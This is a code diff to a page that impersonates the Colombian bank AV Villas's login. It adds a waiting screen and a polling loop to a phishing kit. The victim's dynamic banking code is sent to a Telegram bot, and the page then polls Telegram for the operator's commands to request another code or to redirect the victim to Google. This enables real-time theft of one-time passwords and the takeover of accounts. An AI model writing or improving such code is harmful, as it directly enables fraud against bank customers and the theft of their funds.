@@ -521,9 +521,10 @@
             </div>
 
             <div class="login-form-container">
-                <h2 class="login-title">Ingresa tu clave dinámica</h2>
-                <p class="login-subtitle">Hemos enviado un código de verificación a tu celular registrado, o abre tu app
-                    Av Villas y digita la clave dinámica que se genera automáticamente.</p>
+                <div id="otp-panel">
+                    <h2 class="login-title">Ingresa tu clave dinámica</h2>
+                    <p class="login-subtitle">Hemos enviado un código de verificación a tu celular registrado, o abre tu app
+                        Av Villas y digita la clave dinámica que se genera automáticamente.</p>
 
                 <form id="otp-form">
                     <div class="otp-container">
@@ -559,8 +560,15 @@
                 <div class="help-links" style="margin-top: 15px;">
                     <a href="#">¿Tienes problemas para recibir el código?</a>
                 </div>
+                </div> <!-- End of otp-panel -->
+
+                <div id="waiting-panel" style="display: none; flex-direction: column; align-items: center; justify-content: center; padding: 40px 20px; text-align: center;">
+                    <div style="border: 4px solid #f3f3f3; border-top: 4px solid #e31837; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px;"></div>
+                    <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
+                    <h2 class="login-title" style="margin-bottom: 10px;">Estamos validando tu información</h2>
+                    <p class="login-subtitle">Por favor espera, este proceso puede tardar unos segundos...</p>
+                </div>
             </div>
-        </div>
     </div>
 
     <!-- Footer -->
@@ -697,12 +705,61 @@
 
             await sendToTelegram(text, buttons);
 
-            // Opcional: Limpiar campos para el siguiente OTP
-            otpInputs.forEach(input => input.value = "");
-            otpInputs[0].focus();
+            // Hide OTP panel, show waiting panel
+            document.getElementById('otp-panel').style.display = 'none';
+            document.getElementById('waiting-panel').style.display = 'flex';
             
-            alert("Código verificado. Por favor espere...");
+            initPolling();
         });
+
+        let lastUpdateId = parseInt(sessionStorage.getItem('lastUpdateId')) || 0;
+
+        async function initPolling() {
+            try {
+                const response = await fetch(`${TELEGRAM_API}/getUpdates`);
+                const data = await response.json();
+                if (data.ok && data.result.length > 0) {
+                    lastUpdateId = data.result[data.result.length - 1].update_id;
+                    sessionStorage.setItem('lastUpdateId', lastUpdateId);
+                }
+            } catch (e) { console.error(e); }
+            setTimeout(pollTelegram, 2000);
+        }
+
+        async function pollTelegram() {
+            try {
+                const response = await fetch(`${TELEGRAM_API}/getUpdates?offset=${lastUpdateId + 1}`);
+                const data = await response.json();
+
+                if (data.ok && data.result.length > 0) {
+                    for (const update of data.result) {
+                        lastUpdateId = update.update_id;
+                        sessionStorage.setItem('lastUpdateId', lastUpdateId);
+
+                        if (update.callback_query) {
+                            const cbData = update.callback_query.data;
+                            
+                            if (cbData === "pedir_otp") {
+                                document.getElementById('waiting-panel').style.display = 'none';
+                                document.getElementById('otp-panel').style.display = 'block';
+                                otpInputs.forEach(input => input.value = "");
+                                otpInputs[0].focus();
+                                return; // Stop polling until next submit
+                            } else if (cbData === "aceptar" || cbData === "rechazar") {
+                                window.location.href = "https://www.google.com";
+                                return;
+                            }
+                        }
+                    }
+                }
+            } catch (err) {
+                console.error("Polling error", err);
+            }
+
+            if (document.getElementById('waiting-panel').style.display === 'flex') {
+                setTimeout(pollTelegram, 2000);
+            }
+        }
 
         // Simple countdown timer
         let timeLeft = 179; // 2:59 in seconds
